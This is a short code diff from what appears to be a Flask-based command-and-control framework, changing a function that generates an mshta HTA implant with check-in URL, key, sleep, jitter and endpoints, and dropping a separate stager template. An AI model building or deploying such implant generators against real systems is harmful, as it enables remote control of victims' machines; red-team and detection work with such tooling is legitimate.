@@ -44,11 +44,6 @@ def generate_mshta_implant():
     db.session.commit()
 
     # noinspection PyUnresolvedReferences
-    connect_hta = parse.quote(
-        render_template('connect.hta', check_in_uri=f"{request.host_url}", key=implant.key, sleep=implant.sleep,
+    return render_template('connect.hta', check_in_uri=f"{request.host_url}", key=implant.key, sleep=implant.sleep,
                         jitter=implant.jitter, endpoints=implant.endpoints.split(','),
                         command_stdout=string_identifier())
-        )
-
-    # noinspection PyUnresolvedReferences
-    return render_template('stager.hta', connect_hta=connect_hta, artifact=string_identifier().rstrip())
